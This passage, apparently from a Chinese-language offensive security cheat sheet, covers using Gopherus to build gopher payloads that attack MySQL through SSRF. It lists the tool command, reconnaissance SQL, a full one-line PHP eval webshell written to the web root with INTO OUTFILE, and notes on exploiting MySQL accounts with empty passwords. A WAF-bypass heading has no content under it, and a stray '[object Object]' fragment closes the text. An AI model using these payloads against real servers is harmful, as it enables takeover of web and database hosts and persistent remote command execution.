| `python gopherus.py` | 运行Gopherus自动化Gopher payload生成工具 | command |
| `--exploit mysql` | 指定攻击目标为MySQL服务 | parameter |
| `输入用户名和SQL命令` | 交互式输入MySQL用户名（常为root）和要执行的SQL | value |

#### 4. 执行SQL命令

```
SELECT * FROM users;
SELECT user(), version();
写入WebShell:
SELECT "<?php @eval($_POST[cmd]);?>" INTO OUTFILE "/var/www/html/shell.php";
```

执行SQL命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `SELECT user(), version()` | 查询当前数据库用户和MySQL版本信息 | command |
| `INTO OUTFILE` | MySQL写文件语句，需要FILE权限和secure_file_priv允许 | parameter |
| `/var/www/html/shell.php` | WebShell写入路径，需在Web可访问目录下 | value |

**WAF 绕过**

#### 无密码MySQL

```
如果MySQL允许空密码连接
可以更容易构造攻击载荷
```

利用空密码配置

| 片段 | 说明 | 类型 |
|---|---|---|
| `空密码连接` | MySQL允许空密码时，认证包中密码字段为空 | command |
| `简化协议构造` | 无需计算密码哈希，攻击载荷更简单更可靠 | parameter |

**教程**

[object Object]
